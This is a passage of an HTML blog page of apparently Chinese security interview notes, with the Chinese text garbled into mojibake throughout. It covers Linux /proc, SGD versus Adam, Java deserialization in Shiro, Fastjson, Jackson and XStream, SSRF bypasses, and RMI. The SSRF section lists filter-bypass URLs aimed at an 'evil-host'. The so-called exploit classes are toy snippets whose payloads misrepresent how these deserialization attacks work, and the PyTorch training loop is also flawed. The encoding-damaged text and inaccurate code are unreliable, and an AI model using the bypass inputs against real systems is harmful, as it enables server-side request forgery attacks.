class="line">If-Else Statement</span><br><span class="line">â”œâ”€â”€ Condition: (a &gt; 5)</span><br><span class="line">â”œâ”€â”€ Then Block:</span><br><span class="line">â”‚   â””â”€â”€ Print: &quot;a is greater than 5&quot;</span><br><span class="line">â””â”€â”€ Else Block:</span><br><span class="line">    â””â”€â”€ Print: &quot;a is less than or equal to 5&quot;</span><br></pre></td></tr></table></figure><h3 id="5-Linux-procç›®å½•å’ŒæŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"><a href="#5-Linux-procç›®å½•å’ŒæŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶" class="headerlink" title="5. Linux &#x2F;procç›®å½•å’ŒæŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶"></a>5. Linux &#x2F;procç›®å½•å’ŒæŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶</h3><h4 id="æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ï¼š"><a href="#æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ï¼š" class="headerlink" title="æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ï¼š"></a>æŸ¥çœ‹è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ï¼š</h4><ol><li><p><strong>é€šè¿‡&#x2F;proc&#x2F;[pid]&#x2F;fdç›®å½•</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/[pid]/fd</span><br></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨lsofå‘½ä»¤</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p [pid]</span><br></pre></td></tr></table></figure></li></ol><h4 id="ç¤ºä¾‹ä»£ç ï¼š-4"><a href="#ç¤ºä¾‹ä»£ç ï¼š-4" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼š</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">ls</span> -l /proc/self/fd</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç‰¹å®šè¿›ç¨‹çš„æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">lsof -p 1234</span><br></pre></td></tr></table></figure><h3 id="6-SGDå’ŒAdamçš„åŒºåˆ«"><a href="#6-SGDå’ŒAdamçš„åŒºåˆ«" class="headerlink" title="6. SGDå’ŒAdamçš„åŒºåˆ«"></a>6. SGDå’ŒAdamçš„åŒºåˆ«</h3><h4 id="SGDï¼ˆéšæœºæ¢¯åº¦ä¸‹é™ï¼‰ï¼š"><a href="#SGDï¼ˆéšæœºæ¢¯åº¦ä¸‹é™ï¼‰ï¼š" class="headerlink" title="SGDï¼ˆéšæœºæ¢¯åº¦ä¸‹é™ï¼‰ï¼š"></a>SGDï¼ˆéšæœºæ¢¯åº¦ä¸‹é™ï¼‰ï¼š</h4><ul><li><strong>åŸç†</strong>ï¼šæ¯æ¬¡æ›´æ–°å‚æ•°æ—¶ï¼Œä½¿ç”¨å•ä¸ªæ ·æœ¬çš„æ¢¯åº¦ã€‚</li><li><strong>ä¼˜ç‚¹</strong>ï¼šè®¡ç®—æ•ˆç‡é«˜ï¼Œé€‚åˆå¤§è§„æ¨¡æ•°æ®ã€‚</li><li><strong>ç¼ºç‚¹</strong>ï¼šæ”¶æ•›é€Ÿåº¦è¾ƒæ…¢ï¼Œå®¹æ˜“é™·å…¥å±€éƒ¨æœ€ä¼˜ã€‚</li></ul><h4 id="Adamï¼ˆAdaptive-Moment-Estimationï¼‰ï¼š"><a href="#Adamï¼ˆAdaptive-Moment-Estimationï¼‰ï¼š" class="headerlink" title="Adamï¼ˆAdaptive Moment Estimationï¼‰ï¼š"></a>Adamï¼ˆAdaptive Moment Estimationï¼‰ï¼š</h4><ul><li><strong>åŸç†</strong>ï¼šç»“åˆåŠ¨é‡å’Œè‡ªé€‚åº”å­¦ä¹ ç‡çš„æ–¹æ³•ã€‚</li><li><strong>ä¼˜ç‚¹</strong>ï¼šæ”¶æ•›é€Ÿåº¦å¿«ï¼Œé€‚åˆéå‡¸ä¼˜åŒ–é—®é¢˜ã€‚</li><li><strong>ç¼ºç‚¹</strong>ï¼šå‚æ•°è¾ƒå¤šï¼Œéœ€è¦è°ƒä¼˜ã€‚</li></ul><h4 id="ç¤ºä¾‹ä»£ç ï¼ˆPyTorchï¼‰ï¼š"><a href="#ç¤ºä¾‹ä»£ç ï¼ˆPyTorchï¼‰ï¼š" class="headerlink" title="ç¤ºä¾‹ä»£ç ï¼ˆPyTorchï¼‰ï¼š"></a>ç¤ºä¾‹ä»£ç ï¼ˆPyTorchï¼‰ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰æ¨¡å‹</span></span><br><span class="line">model = nn.Linear(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨SGDä¼˜åŒ–å™¨</span></span><br><span class="line">sgd_optimizer = optim.SGD(model.parameters(), lr=<span class="number">0.01</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨Adamä¼˜åŒ–å™¨</span></span><br><span class="line">adam_optimizer = optim.Adam(model.parameters(), lr=<span class="number">0.001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸå¤±å‡½æ•°</span></span><br><span class="line">criterion = nn.MSELoss()</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¨¡æ‹Ÿè®­ç»ƒ</span></span><br><span class="line">inputs = torch.randn(<span class="number">100</span>, <span class="number">10</span>)</span><br><span class="line">targets = torch.randn(<span class="number">100</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="comment"># å‰å‘ä¼ æ’­</span></span><br><span class="line">    outputs = model(inputs)</span><br><span class="line">    loss = criterion(outputs, targets)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åå‘ä¼ æ’­å’Œä¼˜åŒ–ï¼ˆSGDï¼‰</span></span><br><span class="line">    sgd_optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    sgd_optimizer.step()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åå‘ä¼ æ’­å’Œä¼˜åŒ–ï¼ˆAdamï¼‰</span></span><br><span class="line">    adam_optimizer.zero_grad()</span><br><span class="line">    loss.backward()</span><br><span class="line">    adam_optimizer.step()</span><br></pre></td></tr></table></figure><h4 id="Adamæ›´æ–°è§„åˆ™ï¼š"><a href="#Adamæ›´æ–°è§„åˆ™ï¼š" class="headerlink" title="Adamæ›´æ–°è§„åˆ™ï¼š"></a>Adamæ›´æ–°è§„åˆ™ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Adamæ›´æ–°è§„åˆ™çš„ä¼ªä»£ç </span></span><br><span class="line">m = beta1 * m + (<span class="number">1</span> - beta1) * g</span><br><span class="line">v = beta2 * v + (<span class="number">1</span> - beta2) * (g ** <span class="number">2</span>)</span><br><span class="line">m_hat = m / (<span class="number">1</span> - beta1 ** t)</span><br><span class="line">v_hat = v / (<span class="number">1</span> - beta2 ** t)</span><br><span class="line">theta = theta - lr * m_hat / (torch.sqrt(v_hat) + epsilon)</span><br></pre></td></tr></table></figure><h3 id="Javaååºåˆ—åŒ–åŸç†å’Œå·¥å…·"><a href="#Javaååºåˆ—åŒ–åŸç†å’Œå·¥å…·" class="headerlink" title="Javaååºåˆ—åŒ–åŸç†å’Œå·¥å…·"></a>Javaååºåˆ—åŒ–åŸç†å’Œå·¥å…·</h3><p>Javaååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢ä¸ºJavaå¯¹è±¡çš„è¿‡ç¨‹ã€‚ååºåˆ—åŒ–æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨æœªéªŒè¯çš„è¾“å…¥è¢«ååºåˆ—åŒ–æ—¶ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å¸¸è§çš„ååºåˆ—åŒ–å·¥å…·åŒ…æ‹¬<code>ysoserial</code>ï¼Œç”¨äºç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> <span class="title class_">SerializableClass</span>());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object.ser&quot;</span>));</span><br><span class="line">        <span class="type">SerializableClass</span> <span class="variable">obj</span> <span class="operator">=</span> (SerializableClass) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializableClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Shiroååºåˆ—åŒ–å·¥å…·çš„åŸç†"><a href="#Shiroååºåˆ—åŒ–å·¥å…·çš„åŸç†" class="headerlink" title="Shiroååºåˆ—åŒ–å·¥å…·çš„åŸç†"></a>Shiroååºåˆ—åŒ–å·¥å…·çš„åŸç†</h3><p>Apache Shiroæ˜¯ä¸€ä¸ªJavaå®‰å…¨æ¡†æ¶ï¼Œå…¶ååºåˆ—åŒ–æ¼æ´ï¼ˆå¦‚CVE-2016-4437ï¼‰é€šå¸¸ä¸<code>rememberMe</code>åŠŸèƒ½æœ‰å…³ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚å·¥å…·å¦‚<code>ShiroExploit</code>åˆ©ç”¨äº†Shiroçš„<code>rememberMe</code>åŠŸèƒ½ï¼Œç”Ÿæˆæ¶æ„çš„Cookieå€¼ï¼Œç”¨äºæ”»å‡»ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> <span class="string">&quot;your-secret-key&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;malicious-payload&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encrypted</span> <span class="operator">=</span> cipher.encrypt(payload.getBytes(), key.getBytes()).toBase64();</span><br><span class="line">        System.out.println(<span class="string">&quot;RememberMe: &quot;</span> + encrypted);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨ç ”ç©¶å‘˜"><a href="#å®‰å…¨ç ”ç©¶å‘˜" class="headerlink" title="å®‰å…¨ç ”ç©¶å‘˜"></a>å®‰å…¨ç ”ç©¶å‘˜</h2><h3 id="SSRFçš„ç»•è¿‡å’Œé˜²å¾¡"><a href="#SSRFçš„ç»•è¿‡å’Œé˜²å¾¡" class="headerlink" title="SSRFçš„ç»•è¿‡å’Œé˜²å¾¡"></a>SSRFçš„ç»•è¿‡å’Œé˜²å¾¡</h3><h4 id="SSRFç»•è¿‡"><a href="#SSRFç»•è¿‡" class="headerlink" title="SSRFç»•è¿‡"></a><strong>SSRFç»•è¿‡</strong></h4><ol><li><p><strong>URLé»‘åå•ç»•è¿‡</strong>ï¼š</p><ul><li>ä½¿ç”¨IPçš„åè¿›åˆ¶æˆ–å…«è¿›åˆ¶è¡¨ç¤ºï¼ˆå¦‚<code>127.0.0.1</code>å¯ä»¥è¡¨ç¤ºä¸º<code>2130706433</code>æˆ–<code>017700000001</code>ï¼‰ã€‚</li><li>ä½¿ç”¨URLç¼–ç æˆ–å¤§å°å†™å˜ä½“å¯¹æ•æ„Ÿå­—ç¬¦ä¸²è¿›è¡Œæ¨¡ç³Šå¤„ç†ã€‚</li><li>æ³¨å†Œä¸€ä¸ªè§£æåˆ°ç›®æ ‡IPçš„åŸŸåï¼ˆå¦‚<code>spoofed.burpcollaborator.net</code>ï¼‰æ¥ç»•è¿‡è¿‡æ»¤ã€‚</li></ul></li><li><p><strong>URLç™½åå•ç»•è¿‡</strong>ï¼š</p><ul><li>åˆ©ç”¨<code>@</code>ç¬¦å·è¿›è¡ŒHTTPåŸºæœ¬èº«ä»½è®¤è¯ï¼Œä¾‹å¦‚<code>http://expected-host:fakepassword@evil-host</code>ã€‚</li><li>ä½¿ç”¨<code>#</code>ç¬¦å·çš„ç‰‡æ®µæ ‡è¯†ç¬¦ï¼Œä¾‹å¦‚<code>http://evil-host#expected-host</code>ã€‚</li><li>åˆ©ç”¨DNSå‘½åå±‚æ¬¡ç»“æ„ï¼Œä¾‹å¦‚<code>http://expected-host.evil-host</code>ã€‚</li></ul></li><li><p><strong>URLé‡å®šå‘ç»•è¿‡</strong>ï¼š</p><ul><li>åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œä¾‹å¦‚æ„é€ ä¸€ä¸ªæ»¡è¶³è¿‡æ»¤å™¨çš„URLï¼Œç„¶åé€šè¿‡é‡å®šå‘è®¿é—®ç›®æ ‡åœ°å€ã€‚</li></ul></li><li><p><strong>DNSé‡ç»‘å®šç»•è¿‡</strong>ï¼š</p><ul><li>é…ç½®ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¶æ„DNSæœåŠ¡å™¨ï¼Œè®¾ç½®TTLä¸º0ï¼Œä½¿åŸŸåè§£æåœ¨åˆæ³•å’Œéæ³•IPä¹‹é—´åˆ‡æ¢ã€‚</li></ul></li></ol><h4 id="SSRFé˜²å¾¡"><a href="#SSRFé˜²å¾¡" class="headerlink" title="SSRFé˜²å¾¡"></a><strong>SSRFé˜²å¾¡</strong></h4><ol><li><p><strong>ä¸¥æ ¼çš„è¾“å…¥éªŒè¯</strong>ï¼š</p><ul><li>ä»…å…è®¸è®¿é—®é¢„å®šä¹‰çš„ç™½åå•ä¸»æœºå’Œç«¯å£ï¼Œç¦æ­¢å†…ç½‘IPã€localhostã€ç‰¹æ®Šåè®®ï¼ˆå¦‚<code>file</code>ã€<code>gopher</code>ç­‰ï¼‰ã€‚</li><li>ç¦ç”¨é«˜å±åè®®ï¼Œä»…å…è®¸HTTP&#x2F;HTTPSã€‚</li></ul></li><li><p><strong>é™åˆ¶è¯·æ±‚èŒƒå›´</strong>ï¼š</p><ul><li>ä½¿ç”¨é˜²ç«å¢™è§„åˆ™é™åˆ¶æœåŠ¡å™¨å¯¹å¤–éƒ¨ç½‘ç»œçš„è®¿é—®æƒé™ã€‚</li></ul></li><li><p><strong>éšæœºä»¤ç‰ŒéªŒè¯</strong>ï¼š</p><ul><li>å¯¹éœ€è¦å‘èµ·æœåŠ¡å™¨ç«¯è¯·æ±‚çš„æ“ä½œï¼Œå¢åŠ éšæœºä»¤ç‰Œä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚</li></ul></li><li><p><strong>å›æºé™åˆ¶</strong>ï¼š</p><ul><li>è®¾ç½®æ­£ç¡®çš„å›æºç­–ç•¥ï¼Œé¿å…å› å›æºè¯·æ±‚æš´éœ²å†…ç½‘ã€‚</li></ul></li></ol><h3 id="Fastjsonå’ŒJacksonååºåˆ—åŒ–åŸç†"><a href="#Fastjsonå’ŒJacksonååºåˆ—åŒ–åŸç†" class="headerlink" title="Fastjsonå’ŒJacksonååºåˆ—åŒ–åŸç†"></a>Fastjsonå’ŒJacksonååºåˆ—åŒ–åŸç†</h3><h4 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a><strong>Fastjson</strong></h4><p>Fastjsoné€šè¿‡<code>JSON.parseObject</code>æ–¹æ³•å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚å…¶æ ¸å¿ƒæœºåˆ¶æ˜¯ï¼š</p><ol><li><strong>åŠ¨æ€ç±»åŠ è½½</strong>ï¼šé€šè¿‡<code>Class.forName</code>åŠ¨æ€åŠ è½½ç±»ã€‚</li><li><strong>åå°„è°ƒç”¨</strong>ï¼šä½¿ç”¨åå°„è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•æˆ–<code>set</code>æ–¹æ³•è®¾ç½®å±æ€§å€¼ã€‚</li><li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨<code>@Type</code>æ³¨è§£æŒ‡å®šæ¶æ„ç±»ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a><strong>Jackson</strong></h4><p>Jacksoné€šè¿‡<code>ObjectMapper</code>ç±»å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚å…¶æ ¸å¿ƒæœºåˆ¶æ˜¯ï¼š</p><ol><li><strong>ç±»å‹è§£æ</strong>ï¼šé€šè¿‡<code>@JsonTypeInfo</code>æ³¨è§£æŒ‡å®šç±»å‹ä¿¡æ¯ã€‚</li><li><strong>åå°„è°ƒç”¨</strong>ï¼šä½¿ç”¨åå°„è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•æˆ–<code>set</code>æ–¹æ³•è®¾ç½®å±æ€§å€¼ã€‚</li><li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šæ”»å‡»è€…å¯ä»¥åˆ©ç”¨<code>@JsonTypeInfo</code>æ³¨è§£æŒ‡å®šæ¶æ„ç±»ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.Runtime\&quot;,\&quot;exec\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        mapper.readValue(payload, Object.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BCELå¯ä»¥ç”¨å…¶ä»–ç±»åŠ è½½å™¨å—"><a href="#BCELå¯ä»¥ç”¨å…¶ä»–ç±»åŠ è½½å™¨å—" class="headerlink" title="BCELå¯ä»¥ç”¨å…¶ä»–ç±»åŠ è½½å™¨å—"></a>BCELå¯ä»¥ç”¨å…¶ä»–ç±»åŠ è½½å™¨å—</h3><p>BCELï¼ˆByte Code Engineering Libraryï¼‰å¯ä»¥åŠ¨æ€ç”Ÿæˆå’Œæ“ä½œJavaå­—èŠ‚ç ã€‚é€šè¿‡è‡ªå®šä¹‰ç±»åŠ è½½å™¨ï¼Œå¯ä»¥åŠ è½½ç”Ÿæˆçš„å­—èŠ‚ç ï¼Œä»è€Œç»•è¿‡é»˜è®¤ç±»åŠ è½½å™¨çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.ClassParser;</span><br><span class="line"><span class="keyword">import</span> org.apache.bcel.classfile.JavaClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(<span class="type">byte</span>[] bytecode) &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, bytecode, <span class="number">0</span>, bytecode.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="XStreamååºåˆ—åŒ–"><a href="#XStreamååºåˆ—åŒ–" class="headerlink" title="XStreamååºåˆ—åŒ–"></a>XStreamååºåˆ—åŒ–</h3><p>XStreamé€šè¿‡<code>fromXML</code>æ–¹æ³•å°†XMLå­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡ã€‚å…¶æ ¸å¿ƒæœºåˆ¶æ˜¯ï¼š</p><ol><li><strong>ç±»å‹è§£æ</strong>ï¼šé€šè¿‡<code>&lt;object-type&gt;</code>æ ‡ç­¾æŒ‡å®šç±»ç±»å‹ã€‚</li><li><strong>åå°„è°ƒç”¨</strong>ï¼šä½¿ç”¨åå°„è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•æˆ–<code>set</code>æ–¹æ³•è®¾ç½®å±æ€§å€¼ã€‚</li><li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šæ”»å‡»è€…å¯ä»¥æŒ‡å®šæ¶æ„ç±»ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&lt;java.lang.Runtime&gt;&lt;exec&gt;calc&lt;/exec&gt;&lt;/java.lang.Runtime&gt;&quot;</span>;</span><br><span class="line">        xstream.fromXML(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMIåŸç†ä»¥åŠç›¸å…³æ¼æ´"><a href="#RMIåŸç†ä»¥åŠç›¸å…³æ¼æ´" class="headerlink" title="RMIåŸç†ä»¥åŠç›¸å…³æ¼æ´"></a>RMIåŸç†ä»¥åŠç›¸å…³æ¼æ´</h3><h4 id="RMIåŸç†"><a href="#RMIåŸç†" class="headerlink" title="RMIåŸç†"></a><strong>RMIåŸç†</strong></h4><p>RMIï¼ˆRemote Method Invocationï¼‰å…è®¸Javaå¯¹è±¡åœ¨ä¸åŒJVMä¹‹é—´è°ƒç”¨æ–¹æ³•ã€‚å…¶å·¥ä½œæµç¨‹åŒ…æ‹¬ï¼š</p><ol><li><strong>æ³¨å†ŒæœåŠ¡</strong>ï¼šé€šè¿‡<code>RMIRegistry</code>æ³¨å†ŒæœåŠ¡ã€‚</li><li><strong>è¿œç¨‹è°ƒç”¨</strong>ï¼šå®¢æˆ·ç«¯é€šè¿‡<code>Naming.lookup</code>è·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚</li><li><strong>æ–¹æ³•è°ƒç”¨</strong>ï¼šå®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ï¼Œå‚æ•°å’Œè¿”å›å€¼é€šè¿‡åºåˆ—åŒ–ä¼ 